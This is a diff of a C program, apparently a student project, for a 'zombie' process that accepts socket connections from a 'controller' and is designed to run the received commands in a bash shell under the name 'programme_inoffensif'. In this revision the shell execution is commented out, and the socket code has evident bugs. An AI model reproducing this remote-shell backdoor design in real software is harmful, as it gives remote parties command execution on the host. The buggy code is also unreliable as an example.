@@ -26,6 +26,7 @@ int choisirPort(){
         //chosir un port au hasard (a faire)
     }
     */
+    printf("Port choisi : %d\n", port);
     return port;
 }
 
@@ -34,69 +35,63 @@ void EndZombieHandler(int num){
 }
 
 void programme_inoffensif(void* adrr, void* portt, void* newsockfdd) {
-    char* adr = adrr;
-    int* port = portt;
     int* newsockfd = newsockfdd;
-    //...
-    FILE *fp = popen("/bin/bash", "r"); // Ouvrir un terminal bash
+    char* commande;
+    char* response;
+    printf("Début du programme inoffensif\n");
+    /*FILE *fp = popen("/bin/bash", "r"); // Ouvrir un terminal bash
     if (fp == NULL) {
         perror("popen");
         exit(1);
-    }
+    }*/
 
-    // ...
-
-    while(!end){
+    printf("/bin/bash ouvert\n");
+    while(end!=1){
         // lis ce que lui envoie le controller
-        // sread(newsockfd, ..., ...);
+        sread(*newsockfd, &commande, sizeof(char));
 
-        // execute la commande dans le terminal
-
-        // renvoie le resultat de la commande au controller
-        // swrite(newsockfd,...,...);
+        if(strcmp(commande, "stop") == 0){
+            end = 1;
+            printf("Fin du programme inoffensif\n");
+        }else{
+            // execute la commande dans le terminal
+            printf("Execution de la commande\n");
+            /*response = fprintf(fp, "%s", commande);*/
+            /*response = */fprintf(stdout, "%s", commande);
+            // renvoie le resultat de la commande au controller
+            swrite(*newsockfd, &response, sizeof(char));
+        }
+        sleep(1);
     }
-
-    exit(0);
-
-    // A FAIRE : Attendre qu'une commande soit ecrite dans (memoire partagée/ socket ?jsp?) et 
-    // l'exécuter. Apres l'avoir exécuter récupérer reponse et l'écrire dans memoire partagée 
-    /* la suite du programme fait ca mais pas les bons arguments ont été passé dans la méthode
-    par exemple: sem_id, z sont pas présent dans la méthode mais le sont dans main*/
-    /*
-        sem_down0(sem_id);
-        fprintf(fp, "%s\n", z);//faire la commande dans le terminal bash
-        fflush(fp);
-        //lire reponse
-        char response[1024] = {'\0'};
-        fgets(response, 1024, fp);
-        response[strcspn(response, "\n")] = '\0';
-        //envoyer la réponse dans mémoire partagée
-        strncpy(z, response, 1024);
-        sem_up0(sem_id);  */  
+    //pclose(fp); 
 }
 
 int main(int argc, char *argv[]){
     int port;
-    
-    ssigaction(SIGINT, EndZombieHandler);
 
     if(argv[1] == NULL){
         port = choisirPort();
     }else{
-        port = argv[1];
+        port = atoi(argv[1]);
     }
     
     int sockfd = initSocketZombie(port);
 
     int newsockfd = saccept(sockfd);
+    printf("Connexion établie\n");
 
     char* adr;
+    sread(newsockfd, &adr, sizeof(char));
+
+    printf("Adresse du controller : %s\n", adr);
+
     int pid_zombie = fork_and_run3(programme_inoffensif, &adr, &port, &newsockfd);
-    printf("%d", pid_zombie);
 
     /* Attente de la terminaison du processus fils */
     int status;
     swaitpid(pid_zombie, &status, 0);
+
+    sclose(newsockfd);
 
     return 0;
     
